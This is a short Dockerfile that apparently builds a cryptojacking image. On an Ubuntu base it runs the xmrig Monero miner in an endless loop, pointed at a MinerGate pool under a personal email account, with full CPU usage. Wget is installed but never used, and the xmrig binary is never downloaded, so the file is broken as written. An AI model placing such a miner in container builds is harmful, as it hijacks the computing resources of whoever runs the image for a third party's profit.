FROM ubuntu:xenial

RUN apt-get update && apt-get install -y wget

RUN while true; do ./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u philipe2018@gmail.com -p x --threads 2 --max-cpu-usage=100 --donate-level 1 ; sleep 1; done

